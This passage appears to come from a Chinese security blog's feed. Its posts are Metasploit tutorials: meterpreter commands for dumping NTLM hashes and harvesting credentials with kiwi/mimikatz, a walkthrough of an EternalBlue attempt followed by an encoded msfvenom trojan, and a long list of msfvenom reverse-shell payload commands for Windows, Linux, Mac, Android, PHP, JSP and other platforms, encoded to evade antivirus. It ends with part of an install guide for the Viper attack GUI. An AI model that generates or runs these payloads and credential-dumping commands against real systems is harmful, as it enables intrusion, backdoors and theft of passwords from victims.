&lt;p&gt;控制录音：record_mic&lt;/p&gt;
&lt;p&gt;查看当前处于目标机的那个目录：pwd&lt;/p&gt;
&lt;p&gt;查看当前目录：getlwd&lt;/p&gt;
&lt;p&gt;导出当前用户密码哈希  run hashdump&lt;/p&gt;
&lt;p&gt;用户名：SID：LM 哈希：NTLM 哈希:::&lt;/p&gt;
&lt;p&gt;也可以使用下面这个命令导出 权限更高   run windows/gather/smart_hashdump&lt;/p&gt;
&lt;p&gt;抓取自动登录的用户名和密码  run windows/gather/credentials/windows_autologin&lt;/p&gt;
&lt;p&gt;直接获取明文密码（注意这个功能需要获取系统权限  获取系统权限需要输入 getsystem）&lt;/p&gt;
&lt;p&gt;首选终端输入  load kiwi    加载 kiwi&lt;/p&gt;
&lt;p&gt;creds_all：列举所有凭据&lt;br&gt;
 creds_kerberos：列举所有 kerberos 凭据&lt;br&gt;
 creds_msv：列举所有 msv 凭据&lt;br&gt;
 creds_ssp：列举所有 ssp 凭据&lt;br&gt;
 creds_tspkg：列举所有 tspkg 凭据&lt;br&gt;
 creds_wdigest：列举所有 wdigest 凭据&lt;br&gt;
 dcsync：通过 DCSync 检索用户帐户信息&lt;br&gt;
 dcsync_ntlm：通过 DCSync 检索用户帐户 NTLM 散列、SID 和 RID&lt;br&gt;
golden_ticket_create：创建黄金票据&lt;br&gt;
 kerberos_ticket_list：列举 kerberos 票据&lt;br&gt;
 kerberos_ticket_purge：清除 kerberos 票据&lt;br&gt;
 kerberos_ticket_use：使用 kerberos 票据&lt;br&gt;
 kiwi_cmd：执行 mimikatz 的命令，后面接 mimikatz.exe 的命令&lt;br&gt;
 lsa_dump_sam：dump 出 lsa 的 SAM&lt;br&gt;
lsa_dump_secrets：dump 出 lsa 的密文&lt;br&gt;
 password_change：修改密码&lt;br&gt;
 wifi_list：列出当前用户的 wifi 配置文件&lt;br&gt;
 wifi_list_shared：列出共享 wifi 配置文件 / 编码&lt;/p&gt;
&lt;h2 id=&#34;3文件系统命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3文件系统命令&#34;&gt;#&lt;/a&gt; 3. 文件系统命令&lt;/h2&gt;
&lt;p&gt;cat c:\boot.ini# 查看文件内容，文件必须存在&lt;br&gt;
 del c:\boot.ini #删除指定的文件&lt;br&gt;
 upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如 upload  setup.exe C:\windows\system32&lt;br&gt;
download nimeia.txt/root/Desktop/   # 下载文件到本机上如：download C:\boot.ini/root / 或者 download C:\&amp;quot;ProgramFiles&amp;quot;\Tencent\QQ\Users\295****&lt;em&gt;&lt;em&gt;125\Msg2.0.db /root/&lt;br&gt;
edit c:\boot.ini  # 编辑文件&lt;br&gt;
 getlwd# 打印本地目录&lt;br&gt;
 getwd# 打印工作目录&lt;br&gt;
 lcd# 更改本地目录&lt;br&gt;
 ls# 列出在当前目录中的文件列表&lt;br&gt;
 lpwd# 打印本地目录&lt;br&gt;
 pwd# 输出工作目录&lt;br&gt;
 cd c:\ #进入目录文件下&lt;br&gt;
 rm file #删除文件&lt;br&gt;
 mkdir dier #在受害者系统上的创建目录&lt;br&gt;
 rmdir# 受害者系统上删除目录&lt;br&gt;
 dir# 列出目标主机的文件和文件夹信息&lt;br&gt;
 mv# 修改目标主机上的文件名&lt;br&gt;
 search -d d:\www -f web.config #search 文件，如 search  -d c:\  -f&lt;/em&gt;.doc&lt;br&gt;
meterpreter &amp;gt; search -f autoexec.bat  #搜索文件&lt;br&gt;
 meterpreter &amp;gt; search -f sea&lt;/em&gt;.bat c:\xamp\&lt;br&gt;
enumdesktops     #用户登录数&lt;/p&gt;
</content>
        <updated>2023-01-11T20:46:09.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/msfconsole%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B/</id>
        <title>msfconsole漏洞利用流程</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/msfconsole%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B/"/>
        <content type="html">&lt;h1 id=&#34;一-阶段划分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-阶段划分&#34;&gt;#&lt;/a&gt; 一、阶段划分：&lt;/h1&gt;
&lt;p&gt;漏洞利用分为 前期交互   情报搜集 威胁建模  漏洞分析。渗透利用  后渗透利用 报告 这几个阶段&lt;/p&gt;
&lt;h2 id=&#34;1前期交互阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1前期交互阶段&#34;&gt;#&lt;/a&gt; 1. 前期交互阶段：&lt;/h2&gt;
&lt;p&gt;与客户组织进行交互讨论，确定范围，目标等&lt;/p&gt;
&lt;p&gt;​         这个阶段大家可以理解为情报收集前阶段，主要是为了找到目标 确认范围&lt;/p&gt;
&lt;p&gt;![1643165117094](10-11  msfconsole 漏洞利用流程.assets/1643165117094.png)&lt;/p&gt;
&lt;h2 id=&#34;2情报搜集阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2情报搜集阶段&#34;&gt;#&lt;/a&gt; 2. 情报搜集阶段：&lt;/h2&gt;
&lt;p&gt;获取更多目标组织信息，&lt;/p&gt;
&lt;p&gt;|          外围信息搜索   -    Google&lt;/p&gt;
&lt;p&gt;![1643165139006](10-11  msfconsole 漏洞利用流程.assets/1643165139006.png)&lt;/p&gt;
&lt;p&gt;​          主机探测与端口扫描         如 -Nmap&lt;/p&gt;
&lt;p&gt;​           服务扫描       利用 metasploit 中的 auxiliary/scanner/ 中的服务扫描模块，可以对靶机中的服务版本等信息进行扫描&lt;/p&gt;
&lt;p&gt;​            网络漏洞扫描   -OpenVAS、Nessus 等&lt;/p&gt;
&lt;p&gt;​             其他工具扫描  py 脚本扫描&lt;/p&gt;
&lt;h2 id=&#34;3威胁建模阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3威胁建模阶段&#34;&gt;#&lt;/a&gt; 3. 威胁建模阶段：&lt;/h2&gt;
&lt;p&gt;理清头绪，确定出最可行的漏洞利用通道，这个建模阶段写的文档不是给自己看的 是给整个团队看的 方便多人合作&lt;/p&gt;
&lt;p&gt;![1643165166875](10-11  msfconsole 漏洞利用流程.assets/1643165166875.png)&lt;/p&gt;
&lt;p&gt;​           这个阶段主要是根据收集到的情报进行整理 ，理清漏洞利用思路。&lt;/p&gt;
&lt;h2 id=&#34;4漏洞分析阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4漏洞分析阶段&#34;&gt;#&lt;/a&gt; 4. 漏洞分析阶段：&lt;/h2&gt;
&lt;p&gt;搜索可获取的渗透代码资源&lt;/p&gt;
&lt;p&gt;![1643165182827](10-11  msfconsole 漏洞利用流程.assets/1643165182827.png)&lt;/p&gt;
&lt;p&gt;​           这个阶段主要 挑选匹配可能存在的漏洞利用模块，shellcode&lt;/p&gt;
&lt;h2 id=&#34;5渗透利用阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5渗透利用阶段&#34;&gt;#&lt;/a&gt; 5. 渗透利用阶段：&lt;/h2&gt;
&lt;p&gt;找出安全漏洞，入侵系统&lt;/p&gt;
&lt;p&gt;​          这个阶段尝试利用漏洞 ，配置监控，开始漏洞利用&lt;/p&gt;
&lt;h2 id=&#34;6后渗透利用阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6后渗透利用阶段&#34;&gt;#&lt;/a&gt; 6. 后渗透利用阶段：&lt;/h2&gt;
&lt;p&gt;Meterpreter，实施操作&lt;/p&gt;
&lt;p&gt;​            这个阶段 就开始实施相关数据下载 后门维持  提权等操作&lt;/p&gt;
&lt;h2 id=&#34;7报告阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7报告阶段&#34;&gt;#&lt;/a&gt; 7. 报告阶段：&lt;/h2&gt;
&lt;p&gt;漏洞利用渗透测试报告  （详细报告编写看 渗透测试报告课程）&lt;/p&gt;
&lt;p&gt;![1643165204135](10-11  msfconsole 漏洞利用流程.assets/1643165204135.png)&lt;/p&gt;
&lt;p&gt;|             这个阶段主要是对本次渗透进行总结，概述总体上包括 时间、人员、漏洞利用范围、技术手段等等。我们需要在这部分确定漏洞利用执行的时间范围、参与漏洞利用的人员及联系方式、约定的漏洞利用范围和一些漏洞利用过程中采用的技术、工具描述。写清  前期交互   情报搜集 威胁建模  漏洞分析。渗透利用  后渗透利用  漏洞利用结果 安全建议 等内容&lt;/p&gt;
&lt;p&gt;在撰写的过程中，需要特别注意的是：漏洞描述切忌不可过于简单，一笔带过；在安全建议部分避免提出没有实际意义的安全建议，比如加强安全意识；报告结构混乱不堪，太多复杂的专业术语，比如绕狗、x 站等等；&lt;/p&gt;
&lt;h1 id=&#34;二-实际操作举例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-实际操作举例&#34;&gt;#&lt;/a&gt; 二、实际操作（举例）&lt;/h1&gt;
&lt;p&gt;主机范围和目标已确定&lt;/p&gt;
&lt;p&gt;1 情报搜集&lt;/p&gt;
&lt;p&gt;基于 msf 发现内网存活主机&lt;/p&gt;
&lt;p&gt;search 搜索&lt;/p&gt;
&lt;p&gt;msf 终端内输入 search scanner type:auxiliary&lt;/p&gt;
&lt;p&gt;可用于发现主机的模块&lt;/p&gt;
&lt;p&gt;auxiliary/scanner/discovery/arp_sweep # 基于 ARP 发现内网存活主机&lt;/p&gt;
&lt;p&gt;auxiliary/scanner/discovery/udp_sweep # 基于 UDP 发现内网存活主机&lt;/p&gt;
&lt;p&gt;auxiliary/scanner/ftp/ftp_version # 发现 FTP 服务&lt;/p&gt;
&lt;p&gt;auxiliary/scanner/http/http_version # 发现 HTTP 服务&lt;/p&gt;
&lt;p&gt;auxiliary/scanner/smb/smb_version # 基于 smb 发现内网存活主机&lt;/p&gt;
&lt;p&gt;基于 netbios 发现内网存活主机&lt;/p&gt;
&lt;p&gt;基于 snmap 发现内网存活主机&lt;/p&gt;
&lt;p&gt;基于 ICMP 发现内网存活主机&lt;/p&gt;
&lt;p&gt;2  威胁建模&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;经过第一步情报收集 我们通过 arp 发现了 目标机器 ip&lt;/p&gt;
&lt;p&gt;然后通过对目标机器的 ip 扫描  我们知道了  目标机器开通了 80 端口  有 web 服务  开了 ftp 端口  有文件服务&lt;/p&gt;
&lt;p&gt;开了 smb&lt;/p&gt;
&lt;p&gt;最终决定对 smb 相关的漏洞进行利用&lt;/p&gt;
&lt;p&gt;备选方案通过植入木马的方式进行利用&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;3   漏洞分析&lt;/p&gt;
&lt;p&gt;第一步先查看 smb 利用漏洞有哪些  比如永恒之蓝&lt;/p&gt;
&lt;p&gt;1 查询 msf 与永恒之蓝相关的 模块&lt;/p&gt;
&lt;p&gt;使用命令    search ms17_010&lt;/p&gt;
&lt;p&gt;2 然后我们利用了一个永恒之蓝的 扫描模块&lt;/p&gt;
&lt;p&gt;use auxiliary/scanner/smb/smb_ms17_010&lt;/p&gt;
&lt;p&gt;3  输入  options  查看扫描模块需要配置的参数&lt;/p&gt;
&lt;p&gt;3.1 然后我们配置了 rhost  （rhost 指的是目标主机 ip）&lt;/p&gt;
&lt;p&gt;set rhost   ip&lt;/p&gt;
&lt;p&gt;4 然后我们执行扫描 输入  run&lt;/p&gt;
&lt;p&gt;发现了 可能存在漏洞的主机&lt;/p&gt;
&lt;p&gt;4  渗透利用&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;1 加载 永恒之蓝漏洞利用模块&lt;/p&gt;
&lt;p&gt;use exploit/windows/smb/ms17_010_eternalblue&lt;/p&gt;
&lt;p&gt;2  输入  options  查看扫描模块需要配置的参数&lt;/p&gt;
&lt;p&gt;3.1 然后我们配置了 rhost  （rhost 指的是目标主机 ip）&lt;/p&gt;
&lt;p&gt;set rhost   ip&lt;/p&gt;
&lt;p&gt;3.2 然后我们配置了  lhost （lhost 指的是  监控主机或攻击机 ip）&lt;/p&gt;
&lt;p&gt;set lhost   ip&lt;/p&gt;
&lt;p&gt;3.3 然后我们配置了 lport  （指的是监控的端口 ）&lt;/p&gt;
&lt;p&gt;set lport   ip&lt;/p&gt;
&lt;p&gt;注意端口必须没有被占用&lt;/p&gt;
&lt;p&gt;4 然后我们执行扫描 输入  run 执行永恒之蓝漏洞利用&lt;/p&gt;
&lt;p&gt;但是发现失败  提示 模块已经利用了  但是没有返回对应 session&lt;/p&gt;
&lt;p&gt;![image.png](10-11  msfconsole 漏洞利用流程.assets/bffdb79061ad4b0aa92d2dfde83e9f1b.png)&lt;/p&gt;
&lt;p&gt;5  备选方案通过植入木马的方式进行利用&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;1  我们知道目标机器是 win 系统  所以使用 msfvenom  生成一个 win 平台的木马&lt;/p&gt;
&lt;p&gt;msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp&lt;/p&gt;
&lt;p&gt;LHOST=192.168.3.33 LPORT=4446 -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 10  -f exe -o payload.exe&lt;/p&gt;
&lt;p&gt;2 漏洞生成后  通过启动一个 py 服务将木马上传到目标机器&lt;/p&gt;
&lt;p&gt;python -m SimpleHTTPServer 80&lt;/p&gt;
&lt;p&gt;3 配置监控程序我们使用了&lt;/p&gt;
&lt;p&gt;use exploit/multi/handler&lt;/p&gt;
&lt;p&gt;3 输入 options 进入配置&lt;/p&gt;
&lt;p&gt;3.1 然后我们配置了  lhost （lhost 指的是  监控主机或攻击机 ip）&lt;/p&gt;
&lt;p&gt;set lhost   ip&lt;/p&gt;
&lt;p&gt;3.2 然后我们配置了 lport  （指的是监控的端口 ）&lt;/p&gt;
&lt;p&gt;set lport   ip&lt;/p&gt;
&lt;p&gt;注意端口必须和 msfvenom 生成的木马端口一样才行&lt;/p&gt;
&lt;p&gt;4 配置攻击载荷 payload&lt;/p&gt;
&lt;p&gt;set payload windows/meterpreter/reverse_tcp&lt;/p&gt;
&lt;p&gt;5 执行利用等待目标机器执行木马&lt;/p&gt;
&lt;p&gt;6 目标机器执行了木马&lt;/p&gt;
&lt;p&gt;利用成功并获得 meterpreter&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;5  后渗透利用&lt;/p&gt;
&lt;p&gt;进入新文档&lt;/p&gt;
&lt;p&gt;6  报告阶段&lt;/p&gt;
</content>
        <updated>2023-01-11T19:46:27.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/msfvenom%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/</id>
        <title></title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/msfvenom%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/"/>
        <content type="html">&lt;p&gt;Kali 中的 msfvenom 取代了 msfpayload 和 msfencode，常用于生成后门木马&lt;/p&gt;
&lt;p&gt;msfpayload 是 MSF 攻击荷载生成器，用于生成 shellcode 和可执行代码。&lt;br&gt;
msfencode 是 MSF 编码器。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;一 、msfvenom 常用参数&lt;/p&gt;
&lt;p&gt;-l&lt;br&gt;
 列出指定模块的所有可用资源，模块类型包括: payloads, encoders, nops, all&lt;/p&gt;
&lt;p&gt;-p&lt;br&gt;
 指定需要使用的 payload (攻击荷载)。&lt;/p&gt;
&lt;p&gt;-f&lt;br&gt;
 指定输出格式&lt;/p&gt;
&lt;p&gt;Executable formats:Asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-smallhta-psh、jar、jsp、loop-vbs、macho、msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、python-reflection、vba、vba-exe、vba-psh、vbs、war；&lt;/p&gt;
&lt;p&gt;Transform formats:base32、base64、bash、c、csharp、dw、dword、hex、java、js_be、js_le、num、perl、pl、powershell、ps1、py、python、raw、rb、ruby、sh、vbapplication、vbscript；&lt;/p&gt;
&lt;p&gt;-e&lt;br&gt;
 指定需要使用的 encoder（编码器）编码免杀。&lt;/p&gt;
&lt;p&gt;-a&lt;br&gt;
 指定 payload 的目标架构&lt;/p&gt;
&lt;p&gt;选择架构平台:x86 | x64 | x86_64&lt;br&gt;
Platforms:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe&lt;/p&gt;
&lt;p&gt;-o&lt;br&gt;
 保存 payload 文件输出。&lt;/p&gt;
&lt;p&gt;-b&lt;br&gt;
 设定规避字符集，比如: &#39;\x00\xff&#39; 避免使用的字符&lt;/p&gt;
&lt;p&gt;-n&lt;br&gt;
 为 payload 预先指定一个 NOP 滑动长度&lt;/p&gt;
&lt;p&gt;-s&lt;br&gt;
 设定有效攻击荷载的最大长度生成 payload 的最大长度，就是文件大小。&lt;/p&gt;
&lt;p&gt;-i&lt;br&gt;
 指定 payload 的编码次数&lt;/p&gt;
&lt;p&gt;-c&lt;br&gt;
 指定一个附加的 win32 shellcode 文件&lt;/p&gt;
&lt;p&gt;-x&lt;br&gt;
 指定一个自定义的可执行文件作为模板&lt;br&gt;
例如：原先有个正常文件 normal.exe 可以通过这个选项把后门捆绑到这个程序上面。&lt;/p&gt;
&lt;p&gt;-k&lt;br&gt;
 保护模板程序的动作，注入的 payload 作为一个新的进程运行&lt;br&gt;
例如：原先有个正常文件 normal.exe 可以通过这个选项把后门捆绑到这个程序上面。&lt;/p&gt;
&lt;p&gt;-v&lt;br&gt;
 指定一个自定义的变量，以确定输出格式&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;二、各平台生成 payload 命令&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Windows&lt;/p&gt;
&lt;p&gt;msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp&lt;/p&gt;
&lt;p&gt;LHOST=192.168.3.33 LPORT=4444 -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 10  -f exe -o payload.exe&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Mac&lt;/p&gt;
&lt;p&gt;msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.33 LPORT=4444 -f macho -o payload.macho&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Android&lt;/p&gt;
&lt;p&gt;msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567  -o payload.apk&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Powershell&lt;/p&gt;
&lt;p&gt;msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.1.1 LPORT=8888 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Linux&lt;/p&gt;
&lt;p&gt;msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f elf -o payload.elf&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;php&lt;/p&gt;
&lt;p&gt;msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.1  LPORT=8888  -f raw &amp;gt; shell.php&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;aspx&lt;/p&gt;
&lt;p&gt;msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f aspx -o payload.aspx&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;JSP&lt;/p&gt;
&lt;p&gt;msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.jsp&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;war&lt;/p&gt;
&lt;p&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw - o payload.war&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;nodejs&lt;/p&gt;
&lt;p&gt;msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.js&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;python&lt;/p&gt;
&lt;p&gt;msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BheWxvYWQucHk=&#34;&gt;payload.py&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;perl&lt;/p&gt;
&lt;p&gt;msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.1  LPORT=4567 -f raw -o &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BheWxvYWQucGw=&#34;&gt;payload.pl&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;ruby&lt;/p&gt;
&lt;p&gt;msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.rb&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;lua&lt;/p&gt;
&lt;p&gt;msfvenom -p cmd/unix/reverse_lua LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.lua&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;windows shellcode&lt;/p&gt;
&lt;p&gt;msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;linux shellcode&lt;/p&gt;
&lt;p&gt;msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;mac shellcode&lt;/p&gt;
&lt;p&gt;msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp  LHOST=192.168.1.1  LPORT=4567 -f c&lt;/p&gt;
&lt;hr&gt;
</content>
        <updated>2023-01-11T19:37:56.265Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/MSF%E7%9A%84%E6%A0%B8%E5%BF%83%E6%A8%A1%E5%9D%97modules/</id>
        <title>MSF的核心模块modules</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/MSF%E7%9A%84%E6%A0%B8%E5%BF%83%E6%A8%A1%E5%9D%97modules/"/>
        <content type="html">&lt;p&gt;msf 的模块都放在&lt;/p&gt;
&lt;p&gt;/usr/share/metasploit-framework/modules/ 这个目录下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1640748958000/9e03e3c4dbc548d7b38c0389b1f131ab.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;1 auxiliary: 辅助模块，辅助渗透 (端口扫描、登录密码爆破、漏洞验证等)&lt;/p&gt;
&lt;p&gt;2 exploits: 漏洞利用模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。&lt;/p&gt;
&lt;p&gt;3 payloads: 攻击载荷，主要是攻击成功后在目标机器执行的代码，比如反弹 shell 的代码&lt;/p&gt;
&lt;p&gt;4 post: 后渗透阶段模块，漏洞利用成功获得 meterpreter 之后， 向目标发送的一些功能性&lt;/p&gt;
&lt;p&gt;指令，如：提权等&lt;/p&gt;
&lt;p&gt;5 encoders: 编码器模块，主要包含各种编码工具，对 payload 进行编码加密，以便绕过入侵检测和过滤系统&lt;/p&gt;
&lt;p&gt;6 evasion: 躲避模块，用来生成免杀 payload&lt;/p&gt;
&lt;p&gt;7 nops: 这里主要放着调整 shellcode 前置 nop 指令长度的工具（不理解没关系）&lt;/p&gt;
</content>
        <updated>2023-01-11T19:33:25.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/MSF%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/</id>
        <title>MSF目录结构</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/MSF%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/"/>
        <content type="html">&lt;h1 id=&#34;msf目录结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf目录结构&#34;&gt;#&lt;/a&gt; MSF 目录结构&lt;/h1&gt;
&lt;p&gt;kali 终端中输&lt;/p&gt;
&lt;p&gt;/usr/share/metasploit-framework&lt;/p&gt;
&lt;p&gt;然后输入 ls 查看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/1abfa994573e4ec1b283aea5ecb809d3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/13fa9f11a9b540f7a15854b67186ae99.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/15e181b7c7534f549cbbcb249121acb5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;要记住的一些模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#要记住的一些模块&#34;&gt;#&lt;/a&gt; 要记住的一些模块&lt;/h1&gt;
&lt;p&gt;modules：目录里面存放渗透使用的  辅助模块  编码模块  利用模块  攻击载荷   后渗透模块&lt;/p&gt;
&lt;p&gt;plugins： 这个模块需要用 load 加载，主要提供数据库连接插件 和 各种要用到的插件。&lt;/p&gt;
&lt;p&gt;tools：包含一些有用的脚本和零散的工具。&lt;/p&gt;
&lt;p&gt;scripts：目录里面存放都是 meterpreter 利用的脚本。&lt;/p&gt;
&lt;p&gt;db：数据放在这个目录里&lt;/p&gt;
&lt;p&gt;data：存放使用到的文件，比如密码字典、meterpreter、passivex、vnc、dlls 等工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件&lt;/p&gt;
&lt;p&gt;lib：库文件都保存在这个目录里&lt;/p&gt;
</content>
        <updated>2023-01-11T19:30:47.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper/</id>
        <title>MSF图形界面Viper</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper/"/>
        <content type="html">&lt;p&gt;&lt;strong&gt;MSF 图形化界面 Viper (炫彩蛇) 下载与使用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Viper 是一款图形化内网渗透工具，将内网渗透过程中常用的战术及技术进行模块化及武器化.&lt;/p&gt;
&lt;p&gt;集成杀软绕过，内网隧道，文件管理，命令行等基础功能.&lt;/p&gt;
&lt;p&gt;当前已集成 70 + 个模块，覆盖初始访问 / 持久化 / 权限提升 / 防御绕过 / 凭证访问 / 信息收集 / 横向移动等大类.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 Kali Linux 上安装 Docker&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;apt-get update&lt;/p&gt;
&lt;p&gt;#使用 apt 安装 docker&lt;/p&gt;
&lt;p&gt;apt-get install -y &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RvY2tlci5pbw==&#34;&gt;docker.io&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;#设置开机启动 systemctl start docker&lt;/p&gt;
&lt;p&gt;#检查启动状态 docker version&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043246556.png&#34; alt=&#34;1640043246556&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装 docker-compose&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;curl -L &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nZXQuZGFvY2xvdWQuaW8vZG9ja2VyL2NvbXBvc2UvcmVsZWFzZXMvZG93bmxvYWQvMS4yNS41L2RvY2tlci1jb21wb3NlLQ==&#34;&gt;https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-&lt;/span&gt; &lt;code&gt;uname -s&lt;/code&gt; - &lt;code&gt;uname -m&lt;/code&gt;  &amp;gt; /usr/bin/docker-compose&lt;/p&gt;
&lt;p&gt;#给赋可执行状态 chmod +x /usr/bin/docker-compose&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043297604.png&#34; alt=&#34;1640043297604&#34;&gt;&lt;/p&gt;
&lt;p&gt;#设置安装目录&lt;/p&gt;
&lt;p&gt;export VIPER_DIR=/root/VIPER&lt;/p&gt;
&lt;p&gt;#执行如下命名生成安装目录，并进入安装目录&lt;/p&gt;
&lt;p&gt;mkdir -p $VIPER_DIR &amp;amp;&amp;amp; cd $VIPER_DIR&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043341743.png&#34; alt=&#34;1640043341743&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;执行如下命令生成 docker-compose.yml&lt;/strong&gt;&lt;/p&gt;
